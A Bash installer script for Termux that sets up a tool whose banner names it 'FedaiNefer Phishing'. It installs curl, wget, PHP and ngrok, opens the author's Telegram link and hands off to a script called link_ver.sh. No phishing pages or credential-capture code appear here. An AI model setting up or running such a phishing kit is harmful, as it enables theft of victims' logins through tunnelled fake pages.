#!/bin/bash
#FedaiNefer
#########################################################################################################
# Bu toolun kullanımı kişinin sorumluluğundadır. FedaiNefer hiçbir sorumluluk kabul etmez..             #
#########################################################################################################
# (The use of this tool is the responsibility of the person. FedaiNefer does not take responsibility..) #
#########################################################################################################
clear
echo " "
echo -e "\e[1;49;32m ___       _      _ _  _      __            __  _    _    _    _ "
echo -e "| __|__ __| |__ _(_) \| |___ / _|___ _ _   | _ \ |_ (_)__| |_ (_)_ _  __ _ "
echo -e "| _/ -_) _  / _  | |    / -_)  _/ -_)  _|  |  _/ ' \| ( -|   \| |   \/ _  | "
echo -e "|_|\___\__,_\__,_|_|_|\_\___|_| \___|_|    |_| |_||_|_/__/_||_|_|_||_\__  | "
echo -e "                                                                     |___/ "
echo -e "\e[1;49;31m                                                                            v1.0"
echo " "
echo -e "                                 \e[4;49;35m Code: FedaiNefer \e[0m"
echo -e "		          \e[4;49;35mTelegram:https://t.me/FedaiNefer \e[0m"
echo " "
echo " "
                                #TERMUX-API
	echo -e "\e[1;49;32m termux-api Paketi Yükleniyor... \e[0m"
	echo " "
	sleep 2
        pkg install termux-api -y
        sleep 3
        clear


echo " "
echo " "
echo -e "\e[1;49;31m🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹"
echo -e "\e[1;49;31m🌹  Kabadayılık bitti, sonuncusu yarın Öğle Namazı’nda gidiyor... 🌹											"
echo -e "\e[1;49;31m🌹								  🌹											"
echo -e "\e[1;49;31m🌹                					          🌹											"
echo -e "\e[1;49;31m🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹"
sleep 7
chmod +x FedaiNefer.sh
termux-setup-storage > /dev/null 2>&1 &
sleep 3
echo
echo
                                #GEREKLİ KURULUMLAR
	apt update -y
	apt upgrade -y
 	pkg install git -y
	pkg install nano -y
	apt install curl -y
	apt install wget -y
	apt install php -y
	apt install cat
                                #NGROK KURULUM
	rm -rf /data/data/com.termux/files/usr/bin/ngrok
	wget https://bin.equinox.io/a/m4bqA8ooztd/ngrok-2.2.6-linux-arm.zip
	unzip ngrok-2.2.6-linux-arm.zip
	rm -rf ngrok-2.2.6-linux-arm.zip
	mv ngrok /data/data/com.termux/files/usr/bin
	termux-notification -t "Ngrok kullanıma hazır "
	termux-notification -t "Tool kullanıma hazır."
        termux-toast -b black -c cyan "Kurulum Bitti"
        sleep 3

echo ""
clear
echo
echo -e "\e[1;49;32m ___       _      _ _  _      __            __  _    _    _    _ "
echo -e "| __|__ __| |__ _(_) \| |___ / _|___ _ _   | _ \ |_ (_)__| |_ (_)_ _  __ _ "
echo -e "| _/ -_) _  / _  | |    / -_)  _/ -_)  _|  |  _/ ' \| ( -|   \| |   \/ _  | "
echo -e "|_|\___\__,_\__,_|_|_|\_\___|_| \___|_|    |_| |_||_|_/__/_||_|_|_||_\__  | "
echo -e "                                                                     |___/ "
echo -e "\e[1;49;31m                                                                            v1.0"
echo ""
echo -e "\e[0;49;91m
             ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▒ ▓ ▓ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▒ ▓ ▓ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
             ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
                "
echo -e " \e[36m                                      FedaiNefer "
echo -e " \e[32m                           ******************************* "
echo -e "\e[1;49;32m Lütfen entera bas"
read
echo -e  " \e[7;49;93m ⬇️⬇️⬇️Sorunlar için telegram hesabım⬇️⬇️⬇️\e[0m"
sleep 1
termux-open-url https://t.me/FedaiNefer
sleep 3
clear
echo -e " \e[7;49;96m Bekleyin"
echo -e "\e[0m"
sleep 8
bash link_ver.sh
